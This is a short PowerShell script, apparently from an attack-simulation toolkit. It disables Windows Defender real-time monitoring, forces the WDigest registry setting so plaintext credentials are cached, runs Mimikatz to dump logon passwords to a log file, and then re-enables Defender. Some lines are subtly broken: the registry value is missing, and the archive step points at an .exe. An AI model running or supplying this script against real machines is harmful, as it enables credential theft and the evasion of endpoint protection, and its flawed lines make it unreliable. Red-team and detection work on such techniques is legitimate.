<# Disable Windows Defender #>
Set-MpPreference -DisableRealtimeMonitoring $true

<# Check If Mimikatz#>
$Path = 'C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe'
$Tools = Test-Path -Path $Path

if (!$Tools) {
    Expand-Archive -Path $Path -DestinationPath "C:\Program Files\psattack\tools\mimikatz"
}

<# Attack #>
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d

. C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe "privilege::debug" "log log.txt" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "exit"

<# Enable Windows Defender #>
Set-MpPreference -DisableRealtimeMonitoring $false